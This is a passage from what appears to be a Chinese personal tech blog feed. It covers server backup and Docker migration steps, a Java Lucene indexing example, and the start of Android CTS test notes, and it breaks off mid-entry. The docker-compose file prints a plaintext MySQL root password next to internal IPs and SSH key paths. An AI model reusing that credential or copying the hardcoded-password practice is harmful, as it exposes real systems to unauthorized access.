class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># 暂停所有服务</span><br><span class="line">sudo systemctl stop nginx</span><br><span class="line">sudo systemctl stop tomcat9</span><br><span class="line">sudo systemctl stop mysql</span><br><span class="line"></span><br><span class="line"># 备份MySQL数据库(旧 未使用)</span><br><span class="line">sudo -E rsync -avrHp -e &quot;ssh -i /home/v2/.ssh/id_rsa&quot; /var/lib/mysql/ xsr@192.168.50.124:/media/xsr/f/service-60/mysql/</span><br><span class="line"></span><br><span class="line"># 备份MySQL数据库</span><br><span class="line">sudo rsync -avrHp -e &quot;ssh -i /home/v2/.ssh/id_rsa&quot; /home/v2/backup/daily_backup.sql xsr@192.168.50.124:/media/xsr/f/service-60/docker/mysql/</span><br><span class="line"></span><br><span class="line"># 备份resources目录（存放着bbs的jar包和资源文件）</span><br><span class="line">sudo -E rsync -avrHp -e &quot;ssh -i /home/v2/.ssh/id_rsa&quot; /home/v2/resources/ xsr@192.168.50.124:/media/xsr/f/service-60/resources/</span><br><span class="line"></span><br><span class="line"># 备份补丁仓库文件（补丁仓库相关 这个也未使用）</span><br><span class="line">sudo -E rsync -avrHp -e &quot;ssh -i /home/v2/.ssh/id_rsa&quot; /home/v2/patch/ xsr@192.168.50.124:/media/xsr/f/service-60/patch/</span><br><span class="line"></span><br><span class="line">#备份tomcat9配置（补丁仓库相关 这个其实也未使用 但还是将数据拷贝一份出去作备份）</span><br><span class="line">sudo -E rsync -avrHp -e &quot;ssh -i /home/v2/.ssh/id_rsa&quot; /etc/tomcat9/ xsr@192.168.50.124:/media/xsr/f/service-60/tomcat9/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 启动所有服务</span><br><span class="line">sudo systemctl start mysql</span><br><span class="line">sudo systemctl start nginx</span><br><span class="line">sudo systemctl start tomcat9</span><br></pre></td></tr></table></figure><p>上面的操作将最新的sql拷贝到50.124服务器上之后，需要在该服务器上写一个定时任务脚本来实现容器的重新启动，脚本内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 删除已存在的容器</span><br><span class="line">sudo docker rm -f bbs-mysql</span><br><span class="line"></span><br><span class="line"># 切换到 Docker Compose 文件所在目录</span><br><span class="line">cd /media/xsr/f/service-60/docker</span><br><span class="line"></span><br><span class="line"># 重新启动容器</span><br><span class="line">sudo docker-compose up -d bbs-mysql</span><br></pre></td></tr></table></figure><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><h3 id="欧阳晓晴所给的备份文档："><a href="#欧阳晓晴所给的备份文档：" class="headerlink" title="欧阳晓晴所给的备份文档："></a>欧阳晓晴所给的备份文档：</h3><p>我安装该文档尝试的时候，首先是rsync拷贝文件有遇到权限的问题，先停止MySQL服务，再输入指令就可以拷贝了，另外也有尝试使用其策略，完整的拷贝MySQL相关文件进行部署，是可以实现的，不过感觉不如使用mysqldump来备份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">nginx 1.18.0-0ubuntu1.4 </span><br><span class="line">apche2 2.4.41-4ubuntu3.14</span><br><span class="line">mysql 8.0.33-0ubuntu0.20.04.4</span><br><span class="line">redis 5:5.0.7-2ubuntu0.1</span><br><span class="line"></span><br><span class="line">/var/lib/mysql             mysql数据库位置</span><br><span class="line">/etc/mysql                              mysql配置文件位置</span><br><span class="line"></span><br><span class="line">/var/lib/redis             redis数据库位置</span><br><span class="line">/etc/redis               redis数据库位置</span><br><span class="line"></span><br><span class="line">/home/v2/resources           bbs和path服务器位置</span><br><span class="line">/home/v2/patch             path补丁摆放位置</span><br><span class="line"></span><br><span class="line">/et/apache2/              apache2 服务器配置位置</span><br><span class="line">/var/www/html              apache2 网页数据</span><br><span class="line"></span><br><span class="line">/etc/nginx               nginx服务器配置路径</span><br><span class="line"></span><br><span class="line">/lib/systemd/system/bbs.service     bbs 服务脚本位置</span><br><span class="line">/etc/systemd/system/techvision.service patch服务脚本位置</span><br><span class="line"></span><br><span class="line">请在部署时。将原机器的配置文件删除后再进行替换</span><br><span class="line"></span><br><span class="line">如果更换了服务器ip。请按照下面的例子。进行ip地址替换。下面是从192.168.120.60替换到192.168.50.210</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/pc/dist/index.html</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/pc/dist/assets/index.3cef83e2.js</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/pc/dist/assets/index-legacy.f694b063.js</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/bbs/WEB-INF/data/topicIndex/_8e.fdt</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27;  tomcat/5.8/onlyoffice/DocumentServer/db/14/main/pg_wal/000000010000000000000001</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27;  tomcat/5.8/onlyoffice/DocumentServer/db/14/main/base/16384/16411</span><br><span class="line">sed -i &#x27;s/192.168.120.60/129.168.120.98/g&#x27; /var/www/html/main.dart.js</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql:</span><br><span class="line"></span><br><span class="line">apt install mysql </span><br><span class="line">systemctl stop mysql</span><br><span class="line">sudo rm -r /var/lib/mysql/*</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup/etc/mysql/* /etc/mysql/</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup/var/lib/mysql/* /var/lib/mysql/</span><br><span class="line">systemctl start mysql</span><br><span class="line"></span><br><span class="line">user:</span><br><span class="line"> useradd -m -s /bin/bash -G sudo,sambashare,lxd,lpadmin v2</span><br><span class="line"> passwd v2</span><br><span class="line"></span><br><span class="line">bbs.jar and patch.jar:</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup/home/v2/resources /home/v2/</span><br><span class="line"></span><br><span class="line">redis:</span><br><span class="line">apt install redis</span><br><span class="line">systemctl stop redis</span><br><span class="line">rm -rf /etc/redis/*</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup/etc/redis/* /etc/redis/</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup/var/lib/redis/* /var/lib/redis</span><br><span class="line">systemctl start redis</span><br><span class="line"></span><br><span class="line">systemd service:</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup/lib/systemd/system/bbs.service /lib/systemd/system/</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup//etc/systemd/system/techvision.service /lib/systemd/system/</span><br><span class="line">systemctl start techvision</span><br><span class="line">systemctl start bbs</span><br><span class="line"></span><br><span class="line">nginx:</span><br><span class="line">apt install nginx</span><br><span class="line">systemctl stop nginx</span><br><span class="line">rm -rf /etc/nginx/*</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup//etc/nginx/* /etc/nginx/</span><br><span class="line">systemctl start nginx</span><br><span class="line"></span><br><span class="line">apache2:</span><br><span class="line">apt install apache2</span><br><span class="line">systemctl stop apache2</span><br><span class="line">rm -rf /etc/apache2/*</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup//etc/apache2/* /etc/apache2/</span><br><span class="line">rm -rf /var/www/html/index.*</span><br><span class="line">rsync -avrHp hw@192.168.120.39:/media/hw/f/system-backup/var/www/html/* /var/www/html/</span><br><span class="line">systemctl start apache2</span><br><span class="line"></span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/pc/dist/index.html</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/pc/dist/assets/index.3cef83e2.js</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/pc/dist/assets/index-legacy.f694b063.js</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; tomcat/5.8/bbs/WEB-INF/data/topicIndex/_8e.fdt </span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27;  tomcat/5.8/onlyoffice/DocumentServer/db/14/main/pg_wal/000000010000000000000001 </span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27;  tomcat/5.8/onlyoffice/DocumentServer/db/14/main/base/16384/16411</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27;  /etc/nginx</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27;  /etc/nginx/conf.d/bbs.conf</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.210/g&#x27; /var/www/html/main.dart.js</span><br></pre></td></tr></table></figure><h3 id="部署服务时采用docker的配置文件"><a href="#部署服务时采用docker的配置文件" class="headerlink" title="部署服务时采用docker的配置文件"></a>部署服务时采用docker的配置文件</h3><p>我部署服务，例如MySQL、nginx等都是通过docker来实现，这样方便些，隔离性也好点</p><p>docker-compose.yml文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">version : &#x27;3&#x27;</span><br><span class="line">name: bbs</span><br><span class="line">services:</span><br><span class="line">  bbs-mysql:</span><br><span class="line">    container_name: bbs-mysql</span><br><span class="line">    image: mysql:8.0.35</span><br><span class="line">    restart: always</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: mysql-dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;3306:3306&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./mysql/logs:/var/log/</span><br><span class="line">      - ./mysql/data:/var/lib/mysql</span><br><span class="line">    command: [</span><br><span class="line">          &#x27;mysqld&#x27;,</span><br><span class="line">          &#x27;--lower-case-table-names=0&#x27;</span><br><span class="line">        ]</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: TVI8@techvision</span><br><span class="line">  bbs-nginx:</span><br><span class="line">    restart: always</span><br><span class="line">    container_name: bbs-nginx</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: nginx-dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:80&quot;</span><br><span class="line">      - &quot;8082:8082&quot;</span><br><span class="line">    volumes:</span><br><span class="line">      - ./nginx/dist:/home/v2/resources/tomcat/5.8/pc/dist</span><br><span class="line">      - ./nginx/conf/bbs.conf:/etc/nginx/conf.d/default.conf</span><br><span class="line">      - ./nginx/logs:/var/log/nginx</span><br></pre></td></tr></table></figure><p>nginx-dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 基础镜像</span><br><span class="line">FROM nginx:1.25.3</span><br><span class="line"># author</span><br><span class="line">MAINTAINER hukaichao</span><br></pre></td></tr></table></figure><p>nginx需要将dist文件和bbs.conf文件中原先的ip地址为192.168.120.60全部替换掉。这里写了个脚本来完成这些事（根据上面欧阳晓晴的文档）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.124/g&#x27; /media/xsr/f/service-60/resources/tomcat/5.8/pc/dist/index.html</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.124/g&#x27; /media/xsr/f/service-60/resources/tomcat/5.8/pc/dist/assets/index.3cef83e2.js</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.124/g&#x27; /media/xsr/f/service-60/resources/tomcat/5.8/pc/dist/assets/index-legacy.f694b063.js</span><br><span class="line">sed -i &#x27;s/192.168.120.60/192.168.50.124/g&#x27;  /media/xsr/f/service-60/nginx/conf.d/bbs.conf</span><br></pre></td></tr></table></figure><p>替换完成后也可能会出现浏览器缓存问题，无法显示内容，这个时候换浏览器换设备查看</p><p>在容器中重新加载nginx配置指令：<code>nginx -s reload</code></p><p>mysql-dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 基础镜像</span><br><span class="line">FROM mysql:8.0.35</span><br><span class="line"># author</span><br><span class="line">MAINTAINER hukaichao</span><br><span class="line"></span><br><span class="line"># 执行sql脚本</span><br><span class="line">ADD ./mysql/sql/backup.sql /docker-entrypoint-initdb.d/</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java整合Lucene作全文索引</title>
    <link href="/2023/11/28/Java%E6%95%B4%E5%90%88Lucene%E4%BD%9C%E5%85%A8%E6%96%87%E7%B4%A2%E5%BC%95/"/>
    <url>/2023/11/28/Java%E6%95%B4%E5%90%88Lucene%E4%BD%9C%E5%85%A8%E6%96%87%E7%B4%A2%E5%BC%95/</url>
    
    <content type="html"><![CDATA[<h2 id="lucene介绍"><a href="#lucene介绍" class="headerlink" title="lucene介绍"></a>lucene介绍</h2><p>Lucene 是一个用于全文检索和信息检索的开源软件库。它提供了一个强大而灵活的工具集，可以用于构建各种搜索应用，从简单的文本搜索到复杂的企业级搜索引擎。以下是 Lucene 的一些关键特点和详细信息：</p><h3 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h3><p>文档（Document）： Lucene 中的文档是一个字段的集合，每个字段都有一个名称和一个值。文档可以是任何形式的信息，例如一篇文章、一个网页、一封电子邮件等。</p><p>字段（Field）： 文档中的每个属性都由字段表示，字段有不同的类型，如文本字段、数字字段等。字段可以用于索引和搜索。</p><p>索引（Index）： 索引是 Lucene 存储信息的结构，它允许快速且高效地搜索文档。索引包含了字段的词汇表和反向索引。</p><p>分析器（Analyzer）： 分析器用于将文档的文本拆分成独立的词汇，以便进行索引和搜索。Lucene 提供了多种分析器，包括标准分析器、简单分析器等。</p><h3 id="搜索过程"><a href="#搜索过程" class="headerlink" title="搜索过程"></a>搜索过程</h3><p>创建索引： 在搜索之前，需要将文档添加到索引中。这个过程称为创建索引。索引包含了文档的关键词和它们在文档中的位置。</p><p>查询： 查询是搜索的过程，它涉及构建一个查询对象，描述你想要匹配的文档的条件。Lucene 提供了丰富的查询 API，包括词汇查询、范围查询、布尔查询等。</p><p>评分（Scoring）： Lucene 使用 TF-IDF 等算法对搜索结果进行评分，以便返回最相关的文档。评分考虑了匹配的关键词频率、字段的重要性等因素。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>导入依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- lucene核心库 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.lucene&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;lucene-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.10.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.lucene&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;lucene-analyzers-common&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.10.1&lt;/version&gt; </span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- Lucene的查询解析器 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.lucene&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;lucene-queryparser&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.10.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- lucene的高亮显示 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.lucene&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;lucene-highlighter&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.10.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>PatchIndexer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public class PatchIndexer &#123;</span><br><span class="line"></span><br><span class="line">    private static final String INDEX_DIRECTORY = &quot;./lucene&quot;; // 指定你的索引存储路径</span><br><span class="line"></span><br><span class="line">    public void createIndex() throws IOException &#123;</span><br><span class="line">        Directory directory = FSDirectory.open(Paths.get(INDEX_DIRECTORY));</span><br><span class="line">        Analyzer analyzer = new StandardAnalyzer();</span><br><span class="line">        IndexWriterConfig config = new IndexWriterConfig(analyzer);</span><br><span class="line"></span><br><span class="line">        try (IndexWriter writer = new IndexWriter(directory, config)) &#123;</span><br><span class="line">            Files.walkFileTree(Paths.get(&quot;./upload&quot;), Collections.singleton(FileVisitOption.FOLLOW_LINKS), Integer.MAX_VALUE, new SimpleFileVisitor&lt;Path&gt;() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException &#123;</span><br><span class="line">                    indexPatchFile(writer, file);</span><br><span class="line">                    return FileVisitResult.CONTINUE;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void indexPatchFile(IndexWriter writer, Path file) throws IOException &#123;</span><br><span class="line">        String fileName = file.getFileName().toString().toLowerCase();</span><br><span class="line">        // 只对 diff 和 patch 文件建立索引</span><br><span class="line">        if (fileName.endsWith(&quot;.diff&quot;) || fileName.endsWith(&quot;.patch&quot;)) &#123;</span><br><span class="line">            Document doc = new Document();</span><br><span class="line">            doc.add(new TextField(&quot;content&quot;, new String(Files.readAllBytes(file)), Field.Store.YES));</span><br><span class="line">            doc.add(new StringField(&quot;path&quot;, file.toString(), Field.Store.YES));</span><br><span class="line">            writer.addDocument(doc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PatchSearcher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class PatchSearcher &#123;</span><br><span class="line"></span><br><span class="line">    private static final String INDEX_DIRECTORY = &quot;./lucene&quot;; // 指定你的索引存储路径</span><br><span class="line"></span><br><span class="line">    public void search(String searchString) throws IOException, ParseException, InvalidTokenOffsetsException &#123;</span><br><span class="line">        Directory directory = FSDirectory.open(Paths.get(INDEX_DIRECTORY));</span><br><span class="line">        IndexReader reader = DirectoryReader.open(directory);</span><br><span class="line">        IndexSearcher searcher = new IndexSearcher(reader);</span><br><span class="line">        Analyzer analyzer = new StandardAnalyzer();</span><br><span class="line">        QueryParser parser = new QueryParser(&quot;content&quot;, analyzer);</span><br><span class="line"></span><br><span class="line">        Query query = parser.parse(searchString);</span><br><span class="line">        TopDocs results = searcher.search(query, 10);</span><br><span class="line">        SimpleHTMLFormatter simpleHTMLFormatter = new SimpleHTMLFormatter(&quot;&lt;span style=&#x27;color:red&#x27;&gt;&quot;, &quot;&lt;/span&gt;&quot;);</span><br><span class="line">        Highlighter highlighter = new Highlighter(simpleHTMLFormatter, new QueryScorer(query));</span><br><span class="line">        for (ScoreDoc scoreDoc : results.scoreDocs) &#123;</span><br><span class="line">            Document doc = searcher.doc(scoreDoc.doc);</span><br><span class="line">            System.out.println(&quot;Content: &quot; + doc.get(&quot;content&quot;));</span><br><span class="line">            TokenStream tokenStream = analyzer.tokenStream(&quot;content&quot;, new StringReader(doc.get(&quot;content&quot;)));</span><br><span class="line">            System.out.println(&quot;Path: &quot; + doc.get(&quot;path&quot;));</span><br><span class="line">            String content = highlighter.getBestFragment(tokenStream, doc.get(&quot;content&quot;));</span><br><span class="line">            System.out.println(&quot;Highlighter content: &quot; + content);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        reader.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Analyzer 负责将文本拆分成独立的词汇，这是索引和搜索的一部分。在这里，使用了 StandardAnalyzer，它是 Lucene 提供的标准分析器，能够处理英文文本的分词。</li><li>QueryParser 用于解析用户输入的搜索字符串，将其转换为 Lucene 的查询对象（Query）。</li><li>IndexSearcher 是 Lucene 中用于执行搜索的核心组件。它打开一个索引并执行搜索操作。</li><li>TopDocs 包含了搜索的结果，其中包括匹配文档的得分和排序信息。</li><li>Highlighter 用于在搜索结果中高亮显示与搜索查询匹配的部分。在这里，使用了 SimpleHTMLFormatter 来定义高亮显示的 HTML 标签，QueryScorer 用于评分高亮显示的片段。</li><li>TokenStream 是 Lucene 中的一个抽象类，表示文本的标记流。在这里，使用 analyzer.tokenStream 获取 TokenStream，它将被用于确定要高亮显示的文本范围。</li></ul><p>调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PatchIndexer patchIndexer = new PatchIndexer();</span><br><span class="line">        PatchSearcher patchSearcher = new PatchSearcher();</span><br><span class="line">        String searchString = &quot;STOREPACKAGENAME&quot;;</span><br><span class="line">        patchIndexer.createIndex();</span><br><span class="line">        patchSearcher.search(searchString);</span><br></pre></td></tr></table></figure><h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h2><p>Elasticsearch 是基于 Lucene 构建的分布式搜索引擎，它不仅包含了 Lucene 的搜索能力，还提供了分布式和实时性的支持。Elasticsearch 的目标是构建一个实时、可扩展、分布式的搜索和分析引擎，适用于大规模数据和复杂查询。<br>Elasticsearch 有内置的分布式文件系统，将索引数据分布在集群中的多个节点上。Elasticsearch 负责索引的创建、分片、复制、故障恢复等任务，大大简化了索引管理的工作。</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GMS测试结果分析</title>
    <link href="/2023/11/24/GMS%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90/"/>
    <url>/2023/11/24/GMS%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>测试分析技巧：</p><ul><li><p>在进行测试的时候机器会执行32位(armeabi-v7a)和64位(arm64-v8a)的测试，一般情况下32或者64其中一个通过了，另一个也是能通过了，需要多测几次。</p></li><li><p>不同安卓版本的同一个测试项可能在不同的模块中，是正常现象</p></li></ul><h2 id="CTS测试结果分析"><a href="#CTS测试结果分析" class="headerlink" title="CTS测试结果分析"></a>CTS测试结果分析</h2><h3 id="常见异常"><a href="#常见异常" class="headerlink" title="常见异常"></a>常见异常</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Module:CtsDevicePolicyTestCases</span><br><span class="line">Test:android.devicepolicy.cts.LostModeLocationTest#sendLostModeLocationUpdate_returnTrueAndSendLocationUpdate[IncludeRunOnDeviceOwnerUser]</span><br><span class="line">Details:java.lang.SecurityException: android.devicepolicy.cts from uid 10159 not allowed to perform MOCK_LOCATION</span><br><span class="line"></span><br><span class="line">Module:CtsDevicePolicyTestCases</span><br><span 